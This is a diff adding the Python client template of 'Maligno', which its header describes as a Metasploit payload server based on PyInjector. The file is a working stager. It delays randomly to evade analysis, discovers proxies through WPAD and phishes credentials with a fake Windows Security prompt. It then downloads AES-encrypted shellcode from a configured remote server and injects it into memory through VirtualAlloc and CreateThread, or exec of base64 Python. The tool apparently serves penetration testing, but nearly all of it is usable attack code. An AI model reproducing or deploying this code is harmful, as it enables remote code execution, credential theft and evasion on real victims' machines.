@@ -1,0 +1,653 @@
+################################################################
+#                                                              #
+# Maligno - A Metasploit payload server                        #
+# The client template is a modified version of PyInjector      #
+# written by Juan J. Guelfo @ Encripto AS                      #
+# post@encripto.no                                             #
+#                                                              #
+# Copyright 2013-2016 Encripto AS. All rights reserved.        #
+#                                                              #
+# Maligno is licensed under the FreeBSD license.               #
+# http://www.freebsd.org/copyright/freebsd-license.html        #
+#                                                              #
+################################################################
+#                                                              #
+# Original work and credit:                                    #
+#                                                              #
+# PyInjector Written by Dave Kennedy (ReL1K) @ TrustedSec.com  #
+# Injects shellcode into memory through Python and ctypes      #
+#                                                              #
+# Initial awesome code and credit found here:                  #
+# http://www.debasish.in/2012_04_01_archive.html               #
+#                                                              #
+################################################################
+
+import ctypes, base64, sys, httplib, urllib, platform, getpass
+
+if platform.platform().find("Windows") > -1:
+    import win32api, sspi, win32cred
+
+from Crypto.Cipher import AES
+from time import sleep
+from random import randint
+
+__version__ = "2.5"
+
+<CONFIG>
+cfg_cipher = AES.new(cfg_secret)
+cfg_total = 0
+cfg_has_slept = False
+cfg_nap_time = randint(0, cfg_max_nap_time)
+HTTP_PROXY_SERVER = None
+HTTP_PROXY_AUTH = "UNAUTH"
+HTTP_PROXY_BASIC = None
+HTTP_AUTH_HEADER = "UNAUTH"
+
+
+def prepare_shellcode_injection(psi_shellcode, psi_perpetual_payload, psi_payload_type):
+    if psi_perpetual_payload:
+        while(1):
+            inject_payload(psi_shellcode, psi_payload_type)
+            sleep(30)
+    else:
+        inject_payload(psi_shellcode, psi_payload_type)
+
+
+def inject_payload(ip_shellcode, ip_payload_type):
+    if ip_payload_type == 0:
+        exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]](ip_shellcode))) in globals(), locals()
+
+    elif ip_payload_type == 1:
+        ip_shellcode = ip_shellcode.decode("string_escape")
+        ip_shellcode = bytearray(ip_shellcode)
+        ip_ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(ip_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
+        ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ip_ptr), ctypes.c_int(len(ip_shellcode)))
+        ip_bff = (ctypes.c_char * len(ip_shellcode)).from_buffer(ip_shellcode)
+        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ip_ptr), ip_bff, ctypes.c_int(len(ip_shellcode)))
+        ip_thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ip_ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ip_thread),ctypes.c_int(-1))
+
+
+def pack_data(pd_data, pd_block_size, pd_padding_char):
+    pd_plaintext = "%s#%s#%s" % (str(pd_data), str(pd_block_size), str(pd_padding_char))
+    pd_padded = pd_plaintext + (pd_block_size - len(pd_plaintext) % pd_block_size) * pd_padding_char
+    pd_ctxt = cfg_cipher.encrypt(pd_padded)
+    pd_ctxt = base64.b64encode(pd_ctxt)
+
+    return pd_ctxt
+
+
+def extract_wpad_proxy_list(ewpl_wpad_result):
+    ewpl_proxy_list = []
+    for ewpl_resp_line in ewpl_wpad_result:
+        if ewpl_resp_line.find("PROXY") > -1:
+            ewpl_resp_line = ewpl_resp_line.replace("PROXY", "").replace("return", "").replace("\n", "").replace("\r", "").replace(" ", "").replace("\"", "")
+            ewpl_proxy_candidates = ewpl_resp_line.split(";")
+            for ewpl_p_candidate in ewpl_proxy_candidates:
+                if len(ewpl_p_candidate) > 0:
+                    ewpl_proxy_list.append(ewpl_p_candidate)
+
+    return ewpl_proxy_list
+
+
+def http_request_ntlm(hrn_http_conn, hrn_request_url, hrn_request_headers, hrn_extra_headers, hrn_response_status):
+    global HTTP_PROXY_AUTH
+    HTTP_PROXY_AUTH = "NTLM"
+    hrn_http_resp = None
+    try:
+        hrn_username = win32api.GetUserName()
+        hrn_sspi_cli = sspi.ClientAuth("NTLM", hrn_username)
+        hrn_error = None
+        hrn_out_buf = None
+        hrn_auth_data = None
+        hrn_ntlm_challenge = None
+        hrn_error, hrn_out_buf = hrn_sspi_cli.authorize(hrn_auth_data)
+        hrn_auth_data = hrn_out_buf[0].Buffer
+        hrn_auth_data = base64.b64encode(hrn_auth_data).replace("\012", "")
+
+        hrn_http_conn.putrequest("GET", hrn_request_url, True, True)
+        for hrn_header_index in hrn_request_headers:
+            if hrn_header_index:
+                hrn_http_conn.putheader(hrn_header_index["field"], hrn_header_index["value"])
+
+        for hrn_header_index in hrn_extra_headers:
+            if hrn_header_index:
+                hrn_http_conn.putheader(hrn_header_index["field"], hrn_header_index["value"])
+
+        hrn_http_conn.putheader("Connection", "Keep-Alive")
+        if hrn_response_status == 401:
+            hrn_http_conn.putheader("Authorization", "NTLM %s" % hrn_auth_data)
+
+        elif hrn_response_status == 407:
+            hrn_http_conn.putheader("Proxy-Authorization", "NTLM %s" % hrn_auth_data)
+
+        hrn_http_conn.endheaders()
+        hrn_http_resp = None
+        hrn_http_resp = hrn_http_conn.getresponse()
+
+        hrn_response_headers = None
+        hrn_response_headers = hrn_http_resp.getheaders()
+        for hrn_header_index in hrn_response_headers:
+            if hrn_header_index[0].upper() in [ "WWW-AUTHENTICATE" ]:
+                hrn_ntlm_challenge = hrn_http_resp.getheader("WWW-Authenticate")
+
+            elif hrn_header_index[0].upper() in [ "PROXY-AUTHENTICATE" ]:
+                hrn_ntlm_challenge = hrn_http_resp.getheader("Proxy-Authenticate")
+
+        hrn_http_resp.read()
+        hrn_http_resp.close()
+        hrn_http_resp = None
+        hrn_error = None
+        hrn_out_buf = None
+        hrn_ntlm_response = None
+        hrn_ntlm_challenge_decoded = base64.b64decode(hrn_ntlm_challenge.split()[1])
+        hrn_error, hrn_out_buf = hrn_sspi_cli.authorize(hrn_ntlm_challenge_decoded)
+        hrn_ntlm_response = hrn_out_buf[0].Buffer
+        hrn_ntlm_response = base64.b64encode(hrn_ntlm_response)
+        hrn_http_conn.putrequest("GET", hrn_request_url, True, True)
+        for hrn_header_index in hrn_request_headers:
+            if hrn_header_index:
+                hrn_http_conn.putheader(hrn_header_index["field"], hrn_header_index["value"])
+
+        for hrn_header_index in hrn_extra_headers:
+            if hrn_header_index:
+                hrn_http_conn.putheader(hrn_header_index["field"], hrn_header_index["value"])
+
+        if hrn_response_status == 401:
+            hrn_http_conn.putheader("Connection", "Close")
+            hrn_http_conn.putheader("Authorization", "NTLM %s" % hrn_ntlm_response)
+
+        elif hrn_response_status == 407:
+            hrn_http_conn.putheader("Connection", "Keep-Alive")
+            hrn_http_conn.putheader("Proxy-Authorization", "NTLM %s" % hrn_ntlm_response)
+
+        hrn_http_conn.endheaders()
+        hrn_http_resp = hrn_http_conn.getresponse()
+    except:
+        pass
+
+    return hrn_http_resp
+
+
+def wpad_ntlm(wn_proxy_addr, wn_proxy_port, wn_request_url, wn_request_headers, wn_extra_headers, wn_response_status):
+    wn_proxy_list = []
+    try:
+        wn_http_conn = None
+        wn_http_conn = httplib.HTTPConnection(wn_proxy_addr, int(wn_proxy_port), timeout=10)
+        wn_wpad_response = None
+        wn_wpad_response = http_request_ntlm(wn_http_conn, wn_request_url, wn_request_headers, wn_extra_headers, wn_response_status)
+        if wn_wpad_response.status == 200:
+            wn_wpad_result = wn_wpad_response.read().split("\n")
+            wn_proxy_list = extract_wpad_proxy_list(wn_wpad_result)
+
+        wn_wpad_response.close()
+        wn_http_conn.close()
+    except:
+        pass
+
+    return wn_proxy_list
+
+
+def http_request_basic(hrb_http_conn, hrb_request_url, hrb_request_headers, hrb_extra_headers, hrb_response_status):
+    global HTTP_PROXY_BASIC
+    global HTTP_AUTH_HEADER
+    global HTTP_PROXY_AUTH
+    HTTP_PROXY_AUTH = "BASIC"
+    hrb_http_resp = None
+    hrb_username = None
+    hrb_password = None
+    try:
+        if not HTTP_PROXY_BASIC:
+            if platform.platform().find("Windows") > -1:
+                hrb_username, hrb_password, hrb_savepwd = win32cred.CredUIPromptForCredentials(TargetName=win32api.GetComputerName(), AuthError=0,UserName=win32api.GetUserName(),
+                Flags=win32cred.CREDUI_FLAGS_DO_NOT_PERSIST|win32cred.CREDUI_FLAGS_SHOW_SAVE_CHECK_BOX, Save=False, UiInfo={'MessageText':'Internet access credentials required','CaptionText':'Windows Security'})
+
+            else:
+                print "\nInternet access credentials required\n"
+                hrb_username = raw_input("Username: ")
+                hrb_password = getpass.getpass("Password: ")
+
+            HTTP_PROXY_BASIC = base64.b64encode("%s:%s" % (hrb_username.split("\\")[-1], hrb_password))
+
+        hrb_http_conn.putrequest("GET", hrb_request_url, True, True)
+        for hrb_header_index in hrb_request_headers:
+            if hrb_header_index:
+                hrb_http_conn.putheader(hrb_header_index["field"], hrb_header_index["value"])
+
+        for hrb_header_index in hrb_extra_headers:
+            if hrb_header_index:
+                hrb_http_conn.putheader(hrb_header_index["field"], hrb_header_index["value"])
+
+        hrb_http_conn.putheader("Connection", "Keep-Alive")
+        if hrb_response_status == 401:
+            hrb_http_conn.putheader("Authorization", "Basic %s" % HTTP_PROXY_BASIC)
+            HTTP_AUTH_HEADER = "WWW"
+
+        elif hrb_response_status == 407:
+            hrb_http_conn.putheader("Proxy-Authorization", "Basic %s" % HTTP_PROXY_BASIC)
+            HTTP_AUTH_HEADER = "PROXY"
+
+        hrb_http_conn.endheaders()
+        hrb_http_resp = hrb_http_conn.getresponse()
+    except:
+        if platform.platform().find("Windows") > -1:
+            HTTP_PROXY_BASIC = base64.b64encode("%s:%s" % (win32api.GetUserName().split("\\")[-1], win32api.GetUserName().split("\\")[-1]))
+
+        else:
+            HTTP_PROXY_BASIC = base64.b64encode("%s:%s" % (getpass.getuser(), getpass.getuser()))
+
+        hrb_http_conn.putrequest("GET", hrb_request_url, True, True)
+        for hrb_header_index in hrb_request_headers:
+            if hrb_header_index:
+                hrb_http_conn.putheader(hrb_header_index["field"], hrb_header_index["value"])
+
+        for hrb_header_index in hrb_extra_headers:
+            if hrb_header_index:
+                hrb_http_conn.putheader(hrb_header_index["field"], hrb_header_index["value"])
+
+        hrb_http_conn.putheader("Connection", "Keep-Alive")
+        if hrb_response_status == 401:
+            hrb_http_conn.putheader("Authorization", "Basic %s" % HTTP_PROXY_BASIC)
+            HTTP_AUTH_HEADER = "WWW"
+
+        elif hrb_response_status == 407:
+            hrb_http_conn.putheader("Proxy-Authorization", "Basic %s" % HTTP_PROXY_BASIC)
+            HTTP_AUTH_HEADER = "PROXY"
+
+        hrb_http_conn.endheaders()
+        hrb_http_resp = hrb_http_conn.getresponse()
+
+    return hrb_http_resp
+
+
+def wpad_basic(wb_proxy_addr, wb_proxy_port, wb_request_url, wb_request_headers, wb_extra_headers, wb_response_status):
+    global HTTP_PROXY_BASIC
+    wb_proxy_list = []
+    try:
+        wb_attempts = 0
+        wb_authenticated = False
+        while not wb_authenticated and wb_attempts < 3:
+            wb_wpad_response = None
+            wb_http_conn = None
+            wb_http_conn = httplib.HTTPConnection(wb_proxy_addr, int(wb_proxy_port), timeout=10)
+            wb_wpad_response = http_request_basic(wb_http_conn, wb_request_url, wb_request_headers, wb_extra_headers, wb_response_status)
+            wb_attempts += 1
+            if wb_wpad_response.status == 200:
+                wb_authenticated = True
+                wb_wpad_result = wb_wpad_response.read().split("\n")
+                wb_proxy_list = extract_wpad_proxy_list(wb_wpad_result)
+            else:
+                HTTP_PROXY_BASIC = None
+
+        wb_wpad_response.close()
+        wb_http_conn.close()
+    except:
+        pass
+
+    return wb_proxy_list
+
+
+def proxy_autodiscover(pa_request_headers):
+    pa_proxy_list = []
+    pa_wpad_host = "wpad"
+    pa_wpad_resource = "/wpad.dat"
+    pa_extra_headers = [ { "field":"Host", "value":pa_wpad_host } ]
+    pa_www_authenticate_header = None
+    pa_proxy_authenticate_header = None
+    try:
+        pa_http_conn = None
+        pa_http_conn = httplib.HTTPConnection(pa_wpad_host, 80, timeout=10)
+        pa_http_conn.putrequest("GET", pa_wpad_resource, True, True)
+        for pa_header_index in pa_request_headers:
+            if pa_header_index:
+                pa_http_conn.putheader(pa_header_index["field"], pa_header_index["value"])
+
+        for pa_header_index in pa_extra_headers:
+            if pa_header_index:
+                pa_http_conn.putheader(pa_header_index["field"], pa_header_index["value"])
+
+        pa_http_conn.endheaders()
+        pa_wpad_response = None
+        pa_wpad_response = pa_http_conn.getresponse()
+        if pa_wpad_response.status == 200:
+            pa_wpad_result = pa_wpad_response.read().split("\n")
+            pa_proxy_list = extract_wpad_proxy_list(pa_wpad_result)
+
+        elif pa_wpad_response.status == 401 or pa_wpad_response.status == 407:
+            pa_response_headers = None
+            pa_response_headers = pa_wpad_response.getheaders()
+            pa_ntlm_supported = False
+            pa_basic_supported = False
+            for pa_header_index in pa_response_headers:
+                if pa_header_index[0].upper() in [ "WWW-AUTHENTICATE" ]:
+                    for pa_m in pa_wpad_response.getheader('WWW-Authenticate').split(","):
+                        if pa_m.find("NTLM") > -1:
+                            pa_ntlm_supported = True
+
+                        elif pa_m.find("Basic") > -1:
+                            pa_basic_supported = True
+
+                elif pa_header_index[0].upper() in [ "PROXY-AUTHENTICATE" ]:
+                    for pa_m in pa_wpad_response.getheader('Proxy-Authenticate').split(","):
+                        if pa_m.find("NTLM") > -1:
+                            pa_ntlm_supported = True
+
+                        elif pa_m.find("Basic") > -1:
+                            pa_basic_supported = True
+
+            if pa_ntlm_supported:
+                pa_response_status = pa_wpad_response.status
+                pa_wpad_response.close()
+                if platform.platform().find("Windows") > -1:
+                    pa_proxy_list = wpad_ntlm(pa_wpad_host, 80, pa_wpad_resource, pa_request_headers, pa_extra_headers, pa_response_status)
+
+            elif pa_basic_supported:
+                pa_response_status = pa_wpad_response.status
+                pa_wpad_response.close()
+                pa_proxy_list = wpad_basic(pa_wpad_host, 80, pa_wpad_resource, pa_request_headers, pa_extra_headers, pa_response_status)
+
+        pa_wpad_response.close()
+        pa_http_conn.close()
+    except:
+        pass
+
+    return pa_proxy_list
+
+
+def check_connectivity(cc_p_candidate, cc_request_headers):
+    global HTTP_PROXY_BASIC
+    global HTTP_PROXY_AUTH
+    cc_connectivity = False
+    cc_request_url = "http://www.bing.com/"
+    cc_request_host = "www.bing.com"
+    cc_extra_headers = [ { "field":"Host", "value":cc_request_host } ]
+    cc_www_authenticate_header = None
+    cc_proxy_authenticate_header = None
+    try:
+        if cc_p_candidate:
+            cc_proxy_addr = cc_p_candidate.split(":")[0]
+            cc_proxy_port = cc_p_candidate.split(":")[1]
+            if not cc_proxy_port:
+                cc_proxy_port = 80
+
+            cc_http_conn = None
+            cc_http_conn = httplib.HTTPConnection(str(cc_proxy_addr), int(cc_proxy_port), timeout=10)
+            cc_http_conn.putrequest("GET", cc_request_url, True, True)
+            for cc_header_index in cc_request_headers:
+                if cc_header_index:
+                    cc_http_conn.putheader(cc_header_index["field"], cc_header_index["value"])
+
+            for cc_header_index in cc_extra_headers:
+                if cc_header_index:
+                    cc_http_conn.putheader(cc_header_index["field"], cc_header_index["value"])
+
+            cc_http_conn.endheaders()
+            cc_http_resp = None
+            cc_http_resp = cc_http_conn.getresponse()
+            if cc_http_resp.status == 200 or cc_http_resp.status == 301 or cc_http_resp.status == 302:
+                cc_connectivity = True
+
+            elif cc_http_resp.status == 401 or cc_http_resp.status == 407:
+                cc_response_headers = None
+                cc_response_headers = cc_http_resp.getheaders()
+                cc_ntlm_supported = False
+                cc_basic_supported = False
+                for cc_header_index in cc_response_headers:
+                    if cc_header_index[0].upper() in [ "WWW-AUTHENTICATE" ]:
+                        for cc_m in cc_http_resp.getheader('WWW-Authenticate').split(","):
+                            if cc_m.find("NTLM") > -1:
+                                cc_ntlm_supported = True
+
+                            elif cc_m.find("Basic") > -1:
+                                cc_basic_supported = True
+
+                    elif cc_header_index[0].upper() in [ "PROXY-AUTHENTICATE" ]:
+                        for cc_m in cc_http_resp.getheader('Proxy-Authenticate').split(","):
+                            if cc_m.find("NTLM") > -1:
+                                cc_ntlm_supported = True
+
+                            elif cc_m.find("Basic") > -1:
+                                cc_basic_supported = True
+
+                if cc_ntlm_supported:
+                    cc_response_status = cc_http_resp.status
+                    cc_http_resp.close()
+                    cc_http_conn.close()
+                    if platform.platform().find("Windows") > -1:
+                        cc_http_conn = None
+                        cc_http_resp = None
+                        cc_http_conn = httplib.HTTPConnection(str(cc_proxy_addr), int(cc_proxy_port), timeout=10)
+                        cc_http_resp = http_request_ntlm(cc_http_conn, cc_request_url, cc_request_headers, cc_extra_headers, cc_response_status)
+                        if cc_http_resp.status == 200 or cc_http_resp.status == 301 or cc_http_resp.status == 302:
+                            cc_connectivity = True
+                            HTTP_PROXY_AUTH = "NTLM"
+
+                        cc_http_resp.close()
+
+                elif cc_basic_supported:
+                    cc_response_status = cc_http_resp.status
+                    cc_http_resp.close()
+                    cc_http_conn.close()
+                    cc_attempts = 0
+                    while not cc_connectivity and cc_attempts < 3:
+                        cc_http_conn = None
+                        cc_http_resp = None
+                        cc_http_conn = httplib.HTTPConnection(str(cc_proxy_addr), int(cc_proxy_port), timeout=10)
+                        cc_http_resp = http_request_basic(cc_http_conn, cc_request_url, cc_request_headers, cc_extra_headers, cc_response_status)
+                        cc_attempts += 1
+                        if cc_http_resp.status == 200 or cc_http_resp.status == 301 or cc_http_resp.status == 302:
+                            cc_connectivity = True
+                            HTTP_PROXY_AUTH = "BASIC"
+                        else:
+                            HTTP_PROXY_BASIC = None
+
+                        cc_http_resp.close()
+
+            cc_http_conn.close()
+    except:
+        pass
+
+    return cc_connectivity
+
+
+def build_connection_with_proxy(bcwp_server_addr, bcwp_server_port, bcwp_ssl):
+    global HTTP_PROXY_SERVER
+    bcwp_http_conn = None
+    bcwp_proxy_enabled = False
+    bcwp_proxy_addr = None
+    bcwp_proxy_port = None
+    bcwp_proxy_list = urllib.getproxies()
+    bcwp_request_headers = [ { "field":"Accept", "value":"*/*" }, { "field":"User-Agent", "value":"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" } ]
+    bcwp_tunnel_headers = { "Pragma": "no-cache" }
+    if len(bcwp_proxy_list) > 0:
+        bcwp_proxy_enabled = True
+        if not bcwp_ssl:
+            bcwp_proxy_addr = bcwp_proxy_list["http"].lstrip("http://").split(":")[0]
+            bcwp_proxy_port = bcwp_proxy_list["http"].lstrip("http://").split(":")[-1]
+        else:
+            bcwp_proxy_addr = bcwp_proxy_list["https"].lstrip("https://").split(":")[0]
+            bcwp_proxy_port = bcwp_proxy_list["https"].lstrip("https://").split(":")[-1]
+
+        if check_connectivity("%s:%s" % (bcwp_proxy_addr, bcwp_proxy_port), bcwp_request_headers):
+            HTTP_PROXY_SERVER = "%s:%s" % (bcwp_proxy_addr, bcwp_proxy_port)
+
+    if not bcwp_proxy_enabled:
+        bcwp_proxy_list = proxy_autodiscover(bcwp_request_headers)
+        for bcwp_p_candidate in bcwp_proxy_list:
+            if check_connectivity(bcwp_p_candidate, bcwp_request_headers):
+                bcwp_proxy_addr = bcwp_p_candidate.split(":")[0]
+                bcwp_proxy_port = bcwp_p_candidate.split(":")[-1]
+                HTTP_PROXY_SERVER = "%s:%s" % (bcwp_proxy_addr, bcwp_proxy_port)
+                break
+
+    if HTTP_PROXY_AUTH.upper() in ["BASIC"] and HTTP_PROXY_BASIC and HTTP_AUTH_HEADER.upper() in ["WWW"]:
+        bcwp_tunnel_headers = { "Pragma": "no-cache", "Authorization" : "Basic %s" % (HTTP_PROXY_BASIC) }
+
+    elif HTTP_PROXY_AUTH.upper() in ["BASIC"] and HTTP_PROXY_BASIC and HTTP_AUTH_HEADER.upper() in ["PROXY"]:
+        bcwp_tunnel_headers = { "Pragma": "no-cache", "Proxy-Authorization" : "Basic %s" % (HTTP_PROXY_BASIC) }
+
+    if not bcwp_ssl:
+        bcwp_http_conn = httplib.HTTPConnection(bcwp_proxy_addr, int(bcwp_proxy_port), timeout=10)
+    else:
+        bcwp_http_conn = httplib.HTTPSConnection(bcwp_proxy_addr, int(bcwp_proxy_port), timeout=10)
+        bcwp_http_conn.set_tunnel(bcwp_server_addr, int(bcwp_server_port), headers=bcwp_tunnel_headers)
+
+    return bcwp_http_conn
+
+
+def build_direct_connection(bdc_server_addr, bdc_server_port, bdc_ssl):
+    bdc_http_conn = None
+    if not bdc_ssl:
+        bdc_http_conn = httplib.HTTPConnection(bdc_server_addr, int(bdc_server_port), timeout=10)
+
+    else:
+        bdc_http_conn = httplib.HTTPSConnection(bdc_server_addr, int(bdc_server_port), timeout=10)
+
+    return bdc_http_conn
+
+
+def download_payload(dp_http_conn, dp_server_addr, dp_server_port, dp_ssl_tunnel, dp_http_method, dp_http_headers, dp_req_path, dp_get_caught, dp_req_delay, dp_req_body):
+    global HTTP_PROXY_SERVER
+    if dp_get_caught <= 0:
+        dp_get_caught = 1
+
+    if dp_req_delay < 0:
+        dp_req_delay = 0
+
+    dp_ctext = None
+    for dp_num_reqs in range(0, dp_get_caught):
+        sleep(dp_req_delay)
+        if not dp_ssl_tunnel:
+            if HTTP_PROXY_SERVER:
+                dp_http_conn.putrequest(dp_http_method.upper(), "http://%s:%s%s" % (dp_server_addr, dp_server_port, dp_req_path), True, True)
+            else:
+                dp_http_conn.putrequest(dp_http_method.upper(), dp_req_path, True, True)
+        else:
+            dp_http_conn.putrequest(dp_http_method.upper(), dp_req_path, True, True)
+
+        dp_content_length_present = False
+        for dp_header_index in dp_http_headers:
+            if dp_header_index:
+                dp_http_conn.putheader(dp_header_index["field"], dp_header_index["value"])
+                if dp_header_index["field"].upper() in ["CONTENT-LENGTH"]:
+                    dp_content_length_present = True
+
+        if cfg_failsafe and HTTP_PROXY_SERVER and dp_get_caught <= 1:
+            dp_http_conn.putheader("Content-MD5", pack_data("%s:%s:%s" % (HTTP_PROXY_SERVER, str(HTTP_PROXY_BASIC), str(HTTP_PROXY_AUTH)), 32, "!"))
+
+        if dp_http_method.upper() in ["POST"] and not dp_content_length_present:
+            dp_http_conn.putheader("Content-Length", len(dp_req_body))
+
+        dp_http_conn.endheaders()
+        if dp_http_method.upper() in ["POST"]:
+            dp_http_conn.send(dp_req_body)
+
+        dp_http_resp = None
+        dp_http_resp = dp_http_conn.getresponse()
+        dp_ctext = dp_http_resp.read()
+        if dp_http_method.upper() in ["HEAD"]:
+            dp_ctext = dp_http_resp.getheader("Content-MD5")
+
+        dp_http_resp.close()
+
+    return dp_ctext
+
+
+def unpack_data(ud_ctext, ud_cipher, ud_encoding_method, ud_encoding_rounds, ud_resp_prefix, ud_resp_suffix):
+    try:
+        if len(ud_resp_prefix) > 0:
+            ud_ctext = ud_ctext.replace(ud_resp_prefix, "")
+
+        if len(ud_resp_suffix) > 0:
+            ud_ctext = ud_ctext.replace(ud_resp_suffix, "")
+
+        if ud_encoding_method.upper() in ["BASE64"]:
+            for ud_i in range(0, ud_encoding_rounds):
+                ud_ctext = base64.b64decode(ud_ctext)
+
+        elif ud_encoding_method.upper() in ["HEX"]:
+            for ud_i in range(0, ud_encoding_rounds):
+                ud_ctext = ud_ctext.decode("hex")
+
+        elif ud_encoding_method.upper() in ["BIN"]:
+            ud_ctext = ud_ctext
+
+        else:
+            for ud_i in range(0, ud_encoding_rounds):
+                ud_ctext = base64.b64decode(ud_ctext)
+
+        ud_plaintext = ud_cipher.decrypt(ud_ctext).split(":")
+        ud_padding_char = ud_plaintext[2]
+        ud_shellcode = ud_plaintext[0].rstrip(ud_padding_char)
+
+    except:
+        sys.exit(0)
+
+    return ud_shellcode
+
+
+if __name__ == '__main__':
+    if cfg_nap_time <= 0:
+        cfg_nap_time = 1
+
+    for m_iteration in xrange(0, cfg_nap_time):
+        sleep(1)
+        cfg_total += m_iteration
+        if cfg_total == sum(xrange(0, cfg_nap_time)):
+            cfg_has_slept = True
+
+    if cfg_has_slept:
+        m_ctext = None
+        try:
+            if cfg_http_10:
+                httplib.HTTPConnection._http_vsn = 10
+                httplib.HTTPConnection._http_vsn_str = "HTTP/1.0"
+
+            m_req_path = ""
+            m_req_body = ""
+            if cfg_http_method.upper() in ["GET", "HEAD", "POST"]:
+                if cfg_param_location.upper() in ["QUERYSTRING"]:
+                    m_req_path = "/%s?" % (cfg_req_page.lstrip('/'))
+                    if len(cfg_req_prefix) > 0:
+                        m_req_path += "%s&" % (cfg_req_prefix)
+
+                    m_req_path += "%s=%s" % (cfg_req_param, cfg_payload_id)
+
+                    if len(cfg_req_suffix) > 0:
+                        m_req_path += "&%s" % (cfg_req_suffix)
+
+                elif cfg_param_location.upper() in ["COOKIE"]:
+                    m_req_path = "/%s" % (cfg_req_page.lstrip('/'))
+
+            if cfg_http_method.upper() in ["POST"]:
+                if cfg_param_location.upper() in ["BODY"]:
+                    m_req_path = "/%s" % (cfg_req_page.lstrip('/'))
+
+                    if len(cfg_req_prefix) > 0:
+                        m_req_body += "%s&" % (cfg_req_prefix)
+
+                    m_req_body += "%s=%s" %(cfg_req_param, cfg_payload_id)
+
+                    if len(cfg_req_suffix) > 0:
+                        m_req_body += "&%s" % (cfg_req_suffix)
+
+                    m_req_body += "\n\n"
+            try:
+                m_http_conn = None
+                m_http_conn = build_direct_connection(cfg_server_addr, cfg_server_port, cfg_ssl)
+                m_ctext = download_payload(m_http_conn, cfg_server_addr, cfg_server_port, cfg_ssl, cfg_http_method, cfg_http_headers, m_req_path, cfg_get_caught, cfg_req_delay, m_req_body)
+                m_http_conn.close()
+
+            except:
+                m_http_conn = None
+                m_http_conn = build_connection_with_proxy(cfg_server_addr, cfg_server_port, cfg_ssl)
+                m_ctext = download_payload(m_http_conn, cfg_server_addr, cfg_server_port, cfg_ssl, cfg_http_method, cfg_http_headers, m_req_path, cfg_get_caught, cfg_req_delay, m_req_body)
+                m_http_conn.close()
+
+            m_shellcode = unpack_data(m_ctext, cfg_cipher, cfg_encoding_method, cfg_encoding_rounds, cfg_resp_prefix, cfg_resp_suffix)
+            if m_shellcode and cfg_get_caught <= 1:
+                if cfg_failsafe:
+                    sleep(30)
+                prepare_shellcode_injection(m_shellcode, cfg_perpetual_payload, cfg_payload_type)
+        except:
+            sys.exit(0)
